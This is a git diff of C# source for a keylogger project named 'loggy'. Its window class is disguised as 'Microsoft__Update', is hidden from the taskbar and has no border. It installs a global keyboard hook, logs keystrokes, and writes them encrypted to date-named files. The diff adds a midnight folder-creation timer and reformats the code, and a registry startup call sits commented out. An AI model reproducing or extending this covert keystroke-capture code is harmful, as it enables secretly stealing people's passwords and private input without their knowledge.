@@ -12,34 +12,36 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using HookApp;
 using Microsoft.Win32;
+using System.Threading;
 
 namespace loggy
 {
-	public partial class Microsoft__Update : Form
-	{
-		Y2KeyboardHook _keyboardHook;
-		public Microsoft__Update()
-		{
-			InitializeComponent();
+    public partial class Microsoft__Update : Form
+    {
+        Y2KeyboardHook _keyboardHook;
+        public Microsoft__Update()
+        {
+            InitializeComponent();
 
             this.FormBorderStyle = FormBorderStyle.None;
             this.ShowInTaskbar = false;
-            
+
             string log = "";
 
-            
+            Create_Folder_At_Midnight(new TimeSpan(00, 00, 00));
+
             _keyboardHook = new Y2KeyboardHook();
-			_keyboardHook.Install();
+            _keyboardHook.Install();
 
             int count_space = 0;
 
-			_keyboardHook.KeyDown += (sender, e) =>
-			{
-				if (e.KeyCode == Keys.Space)
-				{
-					log += " ";
+            _keyboardHook.KeyDown += (sender, e) =>
+            {
+                if (e.KeyCode == Keys.Space)
+                {
+                    log += " ";
                     count_space++;
-				}
+                }
                 if (e.KeyCode == Keys.Back)
                 {
                     log += "[back]";
@@ -48,7 +50,7 @@ namespace loggy
                 {
                     log += "[del]";
                 }
-                
+
                 if (e.KeyCode == Keys.Oemcomma)
                 {
                     log += ",";
@@ -62,15 +64,15 @@ namespace loggy
                     log += "[S]";
                 }
                 #region alphabet
-                if ((int)e.KeyCode > 47 && (int)e.KeyCode < 90) 
-                { 
-					//log += e.KeyCode.ToString();
-					log += (new KeysConverter()).ConvertToString(e.KeyCode);
-				}
+                if ((int)e.KeyCode > 47 && (int)e.KeyCode < 90)
+                {
+                    //log += e.KeyCode.ToString();
+                    log += (new KeysConverter()).ConvertToString(e.KeyCode);
+                }
                 #endregion 
                 #region numpad
                 if (((int)e.KeyCode > 95 && (int)e.KeyCode < 106))
-				{
+                {
                     int c = (int)e.KeyCode;
                     switch (c)
                     {
@@ -127,12 +129,12 @@ namespace loggy
                         default:
                             break;
                     }
-                #endregion
+                   
 
                     //log += e.KeyCode.ToString();
                     //log += (new KeysConverter()).ConvertToString(e.KeyCode);
                 }
-
+                #endregion
                 if (count_space == 3)
                 {
                     Save_log(log);
@@ -142,7 +144,7 @@ namespace loggy
                 }
                 //Save_log(Encrypt(log));
             };
-		}
+        }
         protected override CreateParams CreateParams
         {
             get
@@ -153,23 +155,21 @@ namespace loggy
             }
         }
         public void Save_log(string text)
-		{
-           // string date = DateTime.Now.ToString("dd.MM HH:mm:ss tt");
-            string date2 = DateTime.Now.ToString("dd.MM");
-            string path_date = date2;
-            #region create folder 
-            bool exists = Directory.Exists(path_date);
-            if (!exists)
-                Directory.CreateDirectory(path_date);
+        {
+            // string date = DateTime.Now.ToString("dd.MM HH:mm:ss tt");
+            string path_date = DateTime.Now.ToString("dd.MM");
+
+            Create_Folder();
+
             if (!File.Exists(path_date))
             {
                 //File.Create(path);
-                using (StreamWriter sw = new StreamWriter(path_date + @"\" + date2 + ".txt", true)) //nhớ thêm true để viết tiếp vào file, dkm -_-
+                using (StreamWriter sw = new StreamWriter(path_date + @"\" + path_date + ".txt", true)) //nhớ thêm true để viết tiếp vào file, dkm -_-
                 {
                     sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
                 }
             }
-            #endregion
+          
         }
         public void Save_log_no_encrpyt(string text)
         {
@@ -194,7 +194,32 @@ namespace loggy
             }
             return Encpt;
         }
-     
+
+        private System.Threading.Timer timer;
+        private void Create_Folder_At_Midnight(TimeSpan alertTime)
+        {
+            DateTime current = DateTime.Now;
+            TimeSpan timeToGo = alertTime - current.TimeOfDay;
+            if (timeToGo < TimeSpan.Zero)
+            {
+                return;//time already passed
+            }
+            this.timer = new System.Threading.Timer(x =>
+            {
+                this.Create_Folder();
+            }, null, timeToGo, Timeout.InfiniteTimeSpan);
+        }
+
+        private void Create_Folder()
+        {
+            string date2 = DateTime.Now.ToString("dd.MM");
+            string path_date = date2;
+
+            bool exists = Directory.Exists(path_date);
+            if (!exists)
+                Directory.CreateDirectory(path_date);
+        }
+
         private void Microsoft__Update_Load(object sender, EventArgs e)
         {
             //Add_Registry();
